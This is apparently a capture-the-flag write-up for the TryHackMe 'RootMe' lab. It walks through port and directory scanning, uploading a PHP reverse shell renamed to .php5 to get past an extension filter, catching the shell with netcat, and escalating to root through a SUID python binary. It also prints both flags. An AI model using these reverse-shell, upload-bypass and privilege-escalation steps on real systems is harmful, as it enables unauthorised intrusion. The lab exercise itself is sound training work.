# RootMe

First, we conduct standard nmap scan

```
nmap -Pn -sS -sV -p- 10.114.136.87
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -Pn -sS -sV -p- 10.114.136.87
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-06 12:09 EDT
Nmap scan report for 10.114.136.87
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.90 seconds
```

This scan gives us answers to our first 3 questions:
1. Scan the machine, how many ports are open?: 2
2. What version of Apache is running?: 2.4.41
3. What service is running on port 22?: SSH

Then we conduct gobuster directory bruteforcing

```
gobuster dir -u http://10.114.136.87 -w /usr/share/wordlists/dirb/big.txt
```

```
──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.114.136.87 -w /usr/share/wordlists/dirb/big.txt  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.136.87
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.114.136.87/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.114.136.87/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.114.136.87/panel/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.114.136.87/uploads/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

This tells us about the hidden directory

5. What is the hidden directory?: /panel/

When we move to the /panel directory we can see that we can upload files on the website, and then we can access these files at /uploads/{filename}

We try to upload PHP reverse shell

```
cp /usr/share/webshells/php/php-reverse-shell.php ~
nc -nvlp 4444
# (Modify the file and upload it)
```

We can see that the upload failed due to the .php extension. Let's try to bypass this by using .php5 extension

```
cd ~
mv php-reverse-shell.php php-reverse-shell.php5
```

Upload suceeded. Now we can access it on the page by clicking "Veja!". We can see that everything worked and we have shell access on the webserver

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.204.155] from (UNKNOWN) [10.114.136.87] 57776
Linux ip-10-114-136-87 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 17:02:55 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
ip-10-114-136-87
```

Next we search for a user flag

```
$ find / -type f -name user.txt 2>/dev/null
/var/www/user.txt
$ cd /var/www/
$ ls
html
user.txt
$ cat user.txt
THM{y0u_g0t_a_sh3ll}
```

Now we are ready to escalate our priviliges. First, we search for SUID binaries

```
find / -perm -u=s -type f 2>/dev/null
```

We can see that python has SUID enabled. We visit https://gtfobins.org/gtfobins/python/ and use the technique from there.

```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
cd root
ls
root.txt
snap
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```